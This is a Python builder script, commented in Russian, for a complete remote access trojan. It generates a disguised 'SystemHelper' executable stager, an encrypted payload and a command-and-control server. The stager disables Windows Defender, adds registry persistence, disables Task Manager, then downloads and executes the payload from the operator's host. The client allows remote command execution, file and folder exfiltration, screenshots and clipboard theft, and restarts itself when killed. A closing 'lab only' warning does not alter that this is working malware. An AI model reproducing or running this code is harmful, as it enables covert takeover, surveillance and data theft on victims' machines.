#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess
import sys
import os
import time
import socket
import urllib.request
import json
import webbrowser
from cryptography.fernet import Fernet

# ---------- 1. АВТОУСТАНОВКА ЗАВИСИМОСТЕЙ ----------
def install_package(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

required_packages = ['cryptography', 'pyinstaller', 'miniupnpc']
for pkg in required_packages:
    try:
        __import__(pkg)
    except ImportError:
        print(f"[*] Устанавливаю {pkg}...")
        install_package(pkg)

import miniupnpc

# ---------- 2. ФУНКЦИИ ДЛЯ IP и DNS ----------
def get_local_ip():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except:
        return "127.0.0.1"

def get_public_ip():
    services = [
        'https://ifconfig.me/ip',
        'https://api.ipify.org',
        'https://icanhazip.com'
    ]
    for url in services:
        try:
            with urllib.request.urlopen(url, timeout=5) as response:
                ip = response.read().decode('utf-8').strip()
                if ip:
                    return ip
        except:
            continue
    return None

def resolve_domain(domain):
    """Проверяет, резолвится ли домен в IP."""
    try:
        socket.gethostbyname(domain)
        return True
    except:
        return False

# ---------- 3. РАБОТА С ФАЙРВОЛОМ ----------
def add_firewall_rule(port, name='RAT', protocol='TCP'):
    """Добавляет правило в Windows Firewall для входящих соединений."""
    try:
        cmd = f'netsh advfirewall firewall add rule name="{name}" dir=in action=allow protocol={protocol} localport={port}'
        subprocess.run(cmd, shell=True, check=True, capture_output=True)
        print(f"[+] Правило файрвола добавлено: {name} (порт {port}/{protocol})")
        return True
    except Exception as e:
        print(f"[-] Ошибка добавления правила: {e}")
        return False

# ---------- 4. ПРОВЕРКА И ПРОБРОС ПОРТОВ ----------
def check_port(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind(('0.0.0.0', port))
            return True
        except OSError:
            return False

def upnp_port_forward(port, protocol='TCP', description='RAT'):
    try:
        upnp = miniupnpc.UPnP()
        upnp.discoverdelay = 200
        upnp.discover()
        upnp.selectigd()
        result = upnp.addportmapping(port, protocol, upnp.lanaddr, port, description, '')
        if result:
            print(f"[+] UPnP: порт {port}/{protocol} проброшен на {upnp.lanaddr}")
            return True
        else:
            return False
    except Exception as e:
        print(f"[-] UPnP ошибка: {e}")
        return False

# ---------- 5. ВСТРОЕННЫЙ КОД RAT (расширенный) ----------
RAT_CODE = '''
import socket
import threading
import sys
import os
import zipfile
import io
import subprocess
import time
import json
import base64
import re
import psutil
import pyperclip
import winreg
import ctypes
import platform
from datetime import datetime
from mss import mss
from PIL import Image

# ---------- Глобальные настройки ----------
SERVER_HOST = 'SERVER_IP_PLACEHOLDER'
SERVER_PORT = SERVER_PORT_PLACEHOLDER
RECONNECT_DELAY = 5
current_dir = os.getcwd()

# ---------- ЗАЩИТА КЛИЕНТА ОТ ЗАВЕРШЕНИЯ (watchdog) ----------
# Запускается в отдельном потоке. Если основной процесс умирает, перезапускает его.
def watchdog(pid, script_path):
    while True:
        time.sleep(2)
        try:
            # Проверяем, жив ли процесс
            proc = psutil.Process(pid)
            if not proc.is_running():
                # Перезапускаем себя
                subprocess.Popen([sys.executable, script_path], shell=True)
                break
        except:
            # Если процесс мёртв, перезапускаем
            subprocess.Popen([sys.executable, script_path], shell=True)
            break

# ---------- ОТКЛЮЧЕНИЕ ДИСПЕТЧЕРА ЗАДАЧ ----------
def disable_task_manager():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
        handle = winreg.CreateKey(key, subkey)
        winreg.SetValueEx(handle, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(handle)
    except:
        pass

# ---------- ФУНКЦИИ СБОРА ДАННЫХ (БЕЗ ПАРОЛЕЙ) ----------
def get_sysinfo():
    info = {}
    info['hostname'] = socket.gethostname()
    info['user'] = os.getlogin()
    info['os'] = platform.platform()
    info['cpu'] = platform.processor()
    info['cores'] = psutil.cpu_count()
    info['ram'] = round(psutil.virtual_memory().total / (1024**3), 2)
    info['disks'] = []
    for part in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(part.mountpoint)
            info['disks'].append({
                'mount': part.mountpoint,
                'total': round(usage.total / (1024**3), 2),
                'free': round(usage.free / (1024**3), 2)
            })
        except:
            pass
    return json.dumps(info, indent=2)

def execute_cmd(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True,
                                encoding='cp866' if os.name == 'nt' else 'utf-8')
        output = result.stdout + result.stderr
        return output if output else "(команда выполнена, вывод пуст)"
    except Exception as e:
        return f"Ошибка выполнения: {e}"

def get_processes():
    output = ""
    for proc in psutil.process_iter(['pid', 'name']):
        output += f"{proc.info['pid']:>6}  {proc.info['name']}\\n"
    return output

def kill_process(pid):
    try:
        p = psutil.Process(pid)
        p.kill()
        return f"Процесс {pid} завершён."
    except Exception as e:
        return f"Ошибка: {e}"

def get_clipboard():
    return pyperclip.paste()

# ---------- НАВИГАЦИЯ ----------
def get_drives():
    drives = []
    for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
        path = letter + ':\\'
        if os.path.exists(path):
            drives.append(path)
    return drives

def list_directory(path):
    try:
        items = os.listdir(path)
        result = []
        for idx, item in enumerate(items, start=1):
            full = os.path.join(path, item)
            if os.path.isdir(full):
                typ = "DIR"
                size = ""
            else:
                typ = "FILE"
                try:
                    size = str(os.path.getsize(full))
                except:
                    size = "?"
            try:
                mtime = datetime.fromtimestamp(os.path.getmtime(full)).strftime('%Y-%m-%d %H:%M')
            except:
                mtime = ""
            result.append(f"{idx:3}. {item:<30} [{typ}] {size:>10}  {mtime}")
        return "\\n".join(result) if result else "(пусто)"
    except Exception as e:
        return f"Ошибка: {e}"

# ---------- ПЕРЕДАЧА ФАЙЛОВ ----------
def send_file(sock, filepath):
    try:
        if not os.path.isfile(filepath):
            sock.send(b"ERR: File not found")
            return
        filename = os.path.basename(filepath)
        filesize = os.path.getsize(filepath)
        header = f"FILE_START {filename} {filesize}\\n"
        sock.send(header.encode('utf-8'))
        with open(filepath, 'rb') as f:
            sent = 0
            while sent < filesize:
                chunk = f.read(1024)
                if not chunk:
                    break
                sock.send(chunk)
                sent += len(chunk)
        sock.send(b"FILE_END\\n")
    except Exception as e:
        sock.send(f"ERR: {str(e)}".encode('utf-8'))

def send_screenshot(sock):
    try:
        with mss() as sct:
            monitor = sct.monitors[1]
            raw = sct.grab(monitor)
            img = Image.frombytes("RGB", raw.size, raw.rgb)
            buffer = io.BytesIO()
            img.save(buffer, format="JPEG", quality=85)
            img_data = buffer.getvalue()
            filesize = len(img_data)
            header = f"FILE_START screenshot.jpg {filesize}\\n"
            sock.send(header.encode('utf-8'))
            sock.send(img_data)
            sock.send(b"FILE_END\\n")
    except Exception as e:
        sock.send(f"ERR: Screenshot failed: {str(e)}".encode('utf-8'))

def zip_folder(folder_path):
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, start=folder_path)
                zipf.write(file_path, arcname)
    zip_buffer.seek(0)
    return zip_buffer.getvalue()

def send_folder(sock, folder_path):
    try:
        if not os.path.isdir(folder_path):
            sock.send(b"ERR: Folder not found")
            return
        zip_data = zip_folder(folder_path)
        filename = os.path.basename(folder_path) + ".zip"
        filesize = len(zip_data)
        header = f"FILE_START {filename} {filesize}\\n"
        sock.send(header.encode('utf-8'))
        sock.send(zip_data)
        sock.send(b"FILE_END\\n")
    except Exception as e:
        sock.send(f"ERR: {str(e)}".encode('utf-8'))

# ---------- ОБРАБОТЧИК КОМАНД (расширенный) ----------
def handle_command(cmd, sock):
    global current_dir
    cmd = cmd.strip()

    if cmd == "SYSINFO":
        return get_sysinfo()
    elif cmd == "PROCESSES":
        return get_processes()
    elif cmd.startswith("KILL "):
        pid = int(cmd[5:])
        return kill_process(pid)
    elif cmd == "CLIPBOARD":
        return get_clipboard()
    elif cmd == "DRIVES":
        drives = get_drives()
        if not drives:
            return "Диски не найдены."
        return "Доступные диски:\\n" + "\\n".join([f"{i+1}. {d}" for i, d in enumerate(drives)])
    elif cmd == "PWD":
        return current_dir
    elif cmd.startswith("CD "):
        target = cmd[3:].strip()
        if target == "..":
            new_dir = os.path.dirname(current_dir)
            if new_dir == current_dir:
                return "Уже в корне."
            current_dir = new_dir
            return current_dir
        else:
            new_path = os.path.join(current_dir, target)
            if os.path.isdir(new_path):
                current_dir = os.path.abspath(new_path)
                return current_dir
            else:
                return f"Ошибка: папка '{target}' не найдена."
    elif cmd == "LIST":
        return list_directory(current_dir)
    elif cmd.startswith("GETFILE "):
        filepath = cmd[8:].strip()
        if not os.path.isabs(filepath):
            filepath = os.path.join(current_dir, filepath)
        send_file(sock, filepath)
        return None
    elif cmd.startswith("GETFOLDER "):
        folder = cmd[10:].strip()
        if not os.path.isabs(folder):
            folder = os.path.join(current_dir, folder)
        send_folder(sock, folder)
        return None
    elif cmd == "SCREENSHOT":
        send_screenshot(sock)
        return None
    elif cmd.startswith("EXEC "):
        command = cmd[5:].strip()
        return execute_cmd(command)
    elif cmd == "REBOOT":
        os.system("shutdown /r /t 0")
        return "Компьютер перезагружается..."
    elif cmd == "SHUTDOWN":
        os.system("shutdown /s /t 0")
        return "Компьютер выключается..."
    elif cmd == "PERSIST":
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(handle, "SystemHelper", 0, winreg.REG_SZ, sys.argv[0])
            winreg.CloseKey(handle)
            return "Добавлено в автозагрузку."
        except Exception as e:
            return f"Ошибка: {e}"
    # НОВАЯ КОМАНДА: отключение диспетчера задач
    elif cmd == "DISABLE_TASKMGR":
        disable_task_manager()
        return "Диспетчер задач отключён."
    # ЗАГОТОВКА ДЛЯ СБОРА КУКИ/ПАРОЛЕЙ (закомментировано, требует доработки)
    # elif cmd == "GET_PASSWORDS":
    #     # Используйте библиотеку browser-cookie3 и pywin32
    #     return "Функция в разработке (не для продакшена)"
    elif cmd == "QUIT":
        sock.send(b"BYE")
        sock.close()
        sys.exit(0)
    else:
        return f"Неизвестная команда: {cmd}"

# ---------- ПОТОК ПРИЁМА ----------
def receive_messages(sock):
    while True:
        try:
            data = sock.recv(1024).decode('utf-8')
            if not data:
                break
            if data == "BYE":
                break
            response = handle_command(data, sock)
            if response is not None:
                sock.send(response.encode('utf-8'))
        except Exception:
            break
    sock.close()

# ---------- ОСНОВНОЙ ЦИКЛ (с автопереподключением) ----------
def client_loop():
    # Запускаем watchdog для защиты от завершения
    pid = os.getpid()
    script = sys.argv[0]
    watchdog_thread = threading.Thread(target=watchdog, args=(pid, script), daemon=True)
    watchdog_thread.start()

    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER_HOST, SERVER_PORT))
            recv_thread = threading.Thread(target=receive_messages, args=(sock,), daemon=True)
            recv_thread.start()
            recv_thread.join()
        except Exception:
            pass
        time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    if len(sys.argv) >= 3:
        SERVER_HOST = sys.argv[1]
        SERVER_PORT = int(sys.argv[2])
    client_loop()
'''

# ---------- 6. ОСНОВНАЯ ФУНКЦИЯ СБОРКИ ----------
def build(address=None, http_port=8000, cmd_port=5000):
    print("\n" + "="*60)
    print("         АВТОМАТИЧЕСКИЙ БИЛДЕР RAT (с защитой)")
    print("="*60 + "\n")

    # 6.1 Определение адреса (IP или домен)
    if address is None:
        # Пытаемся получить публичный IP
        public = get_public_ip()
        if public:
            address = public
            print(f"[+] Обнаружен публичный IP: {address}")
        else:
            address = get_local_ip()
            print(f"[!] Не удалось определить публичный IP. Использую локальный: {address}")
            print("[!] Если клиент не в вашей сети, используйте домен: python auto_build.py mydomain.duckdns.org")
    else:
        # Проверяем, является ли ввод доменом
        if not address.replace('.', '').isdigit():
            if resolve_domain(address):
                print(f"[+] Домен {address} резолвится в IP {socket.gethostbyname(address)}")
            else:
                print(f"[!] Внимание: домен {address} не резолвится. Проверьте DNS.")
        print(f"[+] Использую адрес: {address}")

    # 6.2 Добавление правил в файрвол
    print("\n[*] Добавление правил в Windows Firewall...")
    add_firewall_rule(http_port, 'RAT_HTTP', 'TCP')
    add_firewall_rule(cmd_port, 'RAT_CMD', 'TCP')

    # 6.3 Проверка свободных портов
    for port, name in [(http_port, 'HTTP'), (cmd_port, 'CMD')]:
        if not check_port(port):
            print(f"[!] Порт {port} ({name}) занят. Попытка освободить...")
            print(f"[!] Пожалуйста, освободите порт {port} или укажите другой.")
            sys.exit(1)
        else:
            print(f"[+] Порт {port} ({name}) свободен.")

    # 6.4 Проброс портов через UPnP (дополнительно)
    print("\n[*] Попытка UPnP проброса портов...")
    if not upnp_port_forward(http_port, 'TCP', 'RAT_HTTP'):
        print(f"[-] UPnP HTTP не сработал.")
    if not upnp_port_forward(cmd_port, 'TCP', 'RAT_CMD'):
        print(f"[-] UPnP CMD не сработал.")

    # 6.5 Генерация зашифрованного payload
    print("\n[*] Подготовка зашифрованного payload...")
    rat_code = RAT_CODE.replace('SERVER_IP_PLACEHOLDER', address)
    rat_code = rat_code.replace('SERVER_PORT_PLACEHOLDER', str(cmd_port))
    key = Fernet.generate_key()
    cipher = Fernet(key)
    encrypted = cipher.encrypt(rat_code.encode())
    with open('payload.enc', 'wb') as f:
        f.write(encrypted)
    print(f"[+] payload.enc создан. Ключ: {key.decode()}")

    # 6.6 Генерация stager.py (с добавлением отключения Task Manager)
    print("[*] Генерация stager.py...")
    register_url = f"http://{address}:{http_port}/register"
    payload_url = f"http://{address}:{http_port}/payload.enc"
    stager_code = f'''
import os
import sys
import time
import urllib.request
import subprocess
import winreg
import ctypes
import base64
import json
import uuid
from cryptography.fernet import Fernet

def disable_defender():
    try:
        key_path = r"SOFTWARE\\Policies\\Microsoft\\Windows Defender"
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
        winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        cmds = [
            "Set-MpPreference -DisableRealtimeMonitoring $true",
            "Set-MpPreference -DisableBehaviorMonitoring $true",
            "Set-MpPreference -DisableBlockAtFirstSeen $true",
            "Set-MpPreference -DisableIOAVProtection $true",
            "Set-MpPreference -DisablePrivacyMode $true",
            "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true",
            "Set-MpPreference -DisableArchiveScanning $true",
            "Set-MpPreference -DisableIntrusionPreventionSystem $true",
            "Set-MpPreference -DisableScriptScanning $true",
            "Set-MpPreference -SubmitSamplesConsent 2"
        ]
        for cmd in cmds:
            subprocess.run(f'powershell -Command "{{cmd}}"', shell=True, capture_output=True)
    except:
        pass

def add_persistence():
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(handle, "SystemHelper", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(handle)
    except:
        pass

def disable_task_manager():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
        handle = winreg.CreateKey(key, subkey)
        winreg.SetValueEx(handle, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(handle)
    except:
        pass

def register_client(uuid_str, url):
    try:
        data = json.dumps({{"uuid": uuid_str}}).encode()
        req = urllib.request.Request(url, data=data, headers={{'Content-Type': 'application/json'}})
        urllib.request.urlopen(req, timeout=5)
    except:
        pass

def download_payload(url):
    for attempt in range(5):
        try:
            response = urllib.request.urlopen(url, timeout=15)
            return response.read()
        except:
            time.sleep(3)
    return None

def execute_payload(encrypted_data, key):
    try:
        cipher = Fernet(key)
        decrypted = cipher.decrypt(encrypted_data)
        exec(decrypted.decode())
    except:
        pass

def main():
    disable_defender()
    time.sleep(3)
    add_persistence()
    disable_task_manager()   # отключаем Task Manager

    client_uuid = str(uuid.uuid4())
    register_url = "{register_url}"
    payload_url = "{payload_url}"
    KEY = {repr(key)}

    register_client(client_uuid, register_url)
    encrypted = download_payload(payload_url)
    if encrypted:
        execute_payload(encrypted, KEY)

if __name__ == "__main__":
    main()
'''
    with open('stager.py', 'w', encoding='utf-8') as f:
        f.write(stager_code)
    print("[+] stager.py создан (с отключением Task Manager).")

    # 6.7 Генерация server.py (без изменений, но с добавлением команды DISABLE_TASKMGR)
    print("[*] Генерация server.py...")
    server_code = f'''
import http.server
import socketserver
import json
import threading
import socket
import sys
import os
import zipfile
from datetime import datetime

class MyHTTPHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/register':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data.decode())
                uuid_client = data.get('uuid')
                if uuid_client:
                    print(f"[+] Зарегистрирован клиент: {{uuid_client}}")
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'OK')
                else:
                    self.send_response(400)
                    self.end_headers()
            except:
                self.send_response(400)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

    def do_GET(self):
        if self.path == '/payload.enc':
            try:
                with open('payload.enc', 'rb') as f:
                    data = f.read()
                self.send_response(200)
                self.send_header('Content-Type', 'application/octet-stream')
                self.end_headers()
                self.wfile.write(data)
            except:
                self.send_response(404)
                self.end_headers()
        else:
            super().do_GET()

def run_http_server(port):
    with socketserver.TCPServer(("", port), MyHTTPHandler) as httpd:
        print(f"[HTTP] Сервер на порту {{port}} (раздача payload)")
        httpd.serve_forever()

# ---------- КОМАНДНЫЙ СЕРВЕР ----------
def print_progress(current, total, prefix='', suffix='', length=40):
    percent = current / total * 100
    filled = int(length * current // total)
    bar = '█' * filled + '░' * (length - filled)
    print(f'\\r{{prefix}} [{{bar}}] {{percent:.1f}}% {{suffix}}', end='', flush=True)
    if current == total:
        print()

def receive_file(sock, filename, filesize):
    try:
        if not os.path.exists("received"):
            os.makedirs("received")
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        base, ext = os.path.splitext(filename)
        new_filename = f"{{base}}_{{timestamp}}{{ext}}"
        filepath = os.path.join("received", new_filename)
        received = 0
        with open(filepath, 'wb') as f:
            while received < filesize:
                chunk = sock.recv(min(1024, filesize - received))
                if not chunk:
                    break
                f.write(chunk)
                received += len(chunk)
                print_progress(received, filesize, prefix=f'Загрузка {{filename}}', suffix='байт')
        end_marker = sock.recv(1024).decode('utf-8')
        if end_marker.strip() != "FILE_END":
            print("[!] Неверный маркер.")
        else:
            print(f"[+] Файл сохранён: {{filepath}}")
    except Exception as e:
        print(f"\\n[!] Ошибка: {{e}}")

def receive_and_unzip(sock, filename, filesize):
    try:
        if not os.path.exists("received"):
            os.makedirs("received")
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        base, ext = os.path.splitext(filename)
        zip_path = os.path.join("received", f"{{base}}_{{timestamp}}{{ext}}")
        received = 0
        with open(zip_path, 'wb') as f:
            while received < filesize:
                chunk = sock.recv(min(1024, filesize - received))
                if not chunk:
                    break
                f.write(chunk)
                received += len(chunk)
                print_progress(received, filesize, prefix=f'Загрузка {{filename}}', suffix='байт')
        end_marker = sock.recv(1024).decode('utf-8')
        if end_marker.strip() != "FILE_END":
            print("[!] Неверный маркер.")
            return
        extract_dir = os.path.join("received", f"folder_{{timestamp}}")
        with zipfile.ZipFile(zip_path, 'r') as zipf:
            zipf.extractall(extract_dir)
        os.remove(zip_path)
        print(f"[+] Архив распакован в: {{extract_dir}}")
    except Exception as e:
        print(f"\\n[!] Ошибка: {{e}}")

last_drives = []
last_items = []

def receive_messages(sock):
    global last_drives, last_items
    while True:
        try:
            data = sock.recv(1024).decode('utf-8')
            if not data:
                print("\\n[!] Клиент отключился.")
                break
            if data.startswith("FILE_START"):
                parts = data.strip().split()
                if len(parts) >= 3:
                    filename = parts[1]
                    filesize = int(parts[2])
                    print(f"\\n[*] Получение {{filename}} ({{filesize}} байт)")
                    if filename.endswith(".zip"):
                        receive_and_unzip(sock, filename, filesize)
                    else:
                        receive_file(sock, filename, filesize)
                continue
            print(f"\\n[Клиент]: {{data}}")
            if "Доступные диски:" in data:
                lines = data.splitlines()
                last_drives = []
                for line in lines:
                    if line.strip() and line[0].isdigit():
                        drive = line.split('.', 1)[1].strip()
                        last_drives.append(drive)
                last_items = last_drives
            elif data.strip().startswith("1.") and not data.startswith("Доступные"):
                lines = data.splitlines()
                last_items = []
                for line in lines:
                    if line.strip() and line[0].isdigit():
                        name = line.split('.', 1)[1].strip().split()[0]
                        last_items.append(name)
        except Exception as e:
            print(f"\\n[!] Ошибка приёма: {{e}}")
            break

def send_messages(sock):
    global last_items
    while True:
        cmd = input()
        if cmd.lower() == '/quit':
            sock.send(b"BYE")
            sock.close()
            sys.exit(0)
        if cmd.strip().isdigit():
            idx = int(cmd) - 1
            if 0 <= idx < len(last_items):
                target = last_items[idx]
                if target.endswith(':\\\\') or target.endswith(':'):
                    cmd = f"CD {{target}}"
                else:
                    cmd = f"CD {{target}}"
            else:
                print("Некорректный номер.")
                continue
        sock.send(cmd.encode('utf-8'))

def run_cmd_server(port):
    host = '0.0.0.0'
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.bind((host, port))
    server_sock.listen(1)
    print(f"[CMD] Сервер команд на порту {{port}}. Ожидание клиента...")
    client_sock, addr = server_sock.accept()
    print(f"[CMD] Клиент подключён: {{addr}}")
    print("\\nДоступные команды RAT (расширенные):")
    print("  SYSINFO         - информация о системе")
    print("  PROCESSES       - список процессов")
    print("  KILL <PID>      - завершить процесс")
    print("  CLIPBOARD       - содержимое буфера обмена")
    print("  DRIVES          - список дисков")
    print("  PWD             - текущая папка")
    print("  LIST            - содержимое папки")
    print("  CD <путь>       - перейти")
    print("  GETFILE <путь>  - получить файл")
    print("  GETFOLDER <путь>- получить папку (ZIP)")
    print("  SCREENSHOT      - скриншот")
    print("  EXEC <команда>  - выполнить команду")
    print("  REBOOT          - перезагрузка")
    print("  SHUTDOWN        - выключение")
    print("  PERSIST         - добавить в автозагрузку")
    print("  DISABLE_TASKMGR - отключить диспетчер задач")
    # print("  GET_PASSWORDS   - сбор паролей (только для обучения!)")
    print("  QUIT            - завершить клиента")
    print("  /quit           - завершить сервер\\n")
    t_recv = threading.Thread(target=receive_messages, args=(client_sock,), daemon=True)
    t_send = threading.Thread(target=send_messages, args=(client_sock,), daemon=True)
    t_recv.start()
    t_send.start()
    t_recv.join()
    t_send.join()
    client_sock.close()
    server_sock.close()

def main():
    http_thread = threading.Thread(target=run_http_server, args=({http_port},), daemon=True)
    http_thread.start()
    run_cmd_server({cmd_port})

if __name__ == "__main__":
    main()
'''
    with open('server.py', 'w', encoding='utf-8') as f:
        f.write(server_code)
    print("[+] server.py создан (с командой DISABLE_TASKMGR).")

    # 6.8 Сборка EXE
    print("\n[*] Сборка EXE с помощью PyInstaller...")
    subprocess.run([
        'pyinstaller',
        '--onefile',
        '--noconsole',
        '--name', 'SystemHelper',
        '--strip',
        'stager.py'
    ], check=True)
    print("[+] EXE собран: dist/SystemHelper.exe")

    # 6.9 Проверка доступности сервера
    if address != get_local_ip():
        test_url = f"http://{address}:{http_port}/payload.enc"
        try:
            urllib.request.urlopen(test_url, timeout=5)
            print(f"[+] Сервер доступен извне: {test_url}")
        except:
            print(f"[-] Сервер НЕ ДОСТУПЕН. Проверьте правила файрвола и проброс портов.")
    else:
        test_url = f"http://localhost:{http_port}/payload.enc"

    # 6.10 Запуск сервера
    print("\n[*] Запуск сервера (новое окно CMD)...")
    subprocess.Popen(['start', 'cmd', '/k', 'python server.py'], shell=True)

    # 6.11 Финальная информация
    print("\n" + "="*60)
    print("        ✅ СБОРКА ЗАВЕРШЕНА УСПЕШНО")
    print("="*60)
    print(f"   Адрес сервера: {address}")
    print(f"   HTTP-порт: {http_port} (для скачивания payload)")
    print(f"   CMD-порт: {cmd_port} (для команд)")
    print(f"   EXE-файл: {os.path.abspath('dist/SystemHelper.exe')}")
    print(f"   Правила файрвола добавлены для портов {http_port} и {cmd_port}.")
    print("\n   Команды управления (в консоли сервера):")
    print("   SYSINFO, LIST, GETFILE, SCREENSHOT, DISABLE_TASKMGR и другие.")
    print("\n   Проверьте доступность сервера по ссылке:")
    print(f"   {test_url}")
    print("\n   ⚠️ ВНИМАНИЕ: используйте только в своих лабораторных средах!")
    print("="*60 + "\n")

# ---------- 7. ТОЧКА ВХОДА ----------
if __name__ == "__main__":
    if len(sys.argv) >= 2:
        address = sys.argv[1]
        http_port = int(sys.argv[2]) if len(sys.argv) > 2 else 8000
        cmd_port = int(sys.argv[3]) if len(sys.argv) > 3 else 5000
    else:
        address = None
        http_port = 8000
        cmd_port = 5000
    build(address, http_port, cmd_port)